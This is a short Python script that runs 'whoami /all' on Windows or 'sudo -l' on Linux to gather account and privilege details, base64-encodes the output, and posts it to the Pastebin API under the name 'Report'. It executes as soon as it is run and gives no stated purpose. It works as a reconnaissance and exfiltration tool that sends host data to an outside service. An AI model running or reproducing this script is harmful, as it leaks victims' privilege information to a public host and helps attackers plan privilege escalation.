import requests
import subprocess
import os
import base64


def wind():
    data = []
    x = subprocess.Popen("whoami /all", stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    str, sterr = x.communicate()
    if sterr != b'':
        data.append(sterr.decode())
    else:
        data.append(str.decode())
    data = "\n".join(data)
    upload(base64.b64encode(data.encode()))


def linux():
    data = []
    x = subprocess.Popen("sudo -l", stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
    str, sterr = x.communicate()
    if sterr != b'':
        data.append(sterr.decode())
    else:
        data.append(str.decode())
    data = "\n".join(data)
    upload(base64.b64encode(data.encode()))


def upload(res):
    url = 'https://pastebin.com/api/api_post.php'
    api = {'api_dev_key': "",
           'api_option': "paste",
           'api_paste_code': res,
           'api_paste_name': "Report"
           }
    send = requests.post(url, data=api)


def main():
    if os.name == "nt":
        wind()
    else:
        linux()


main()
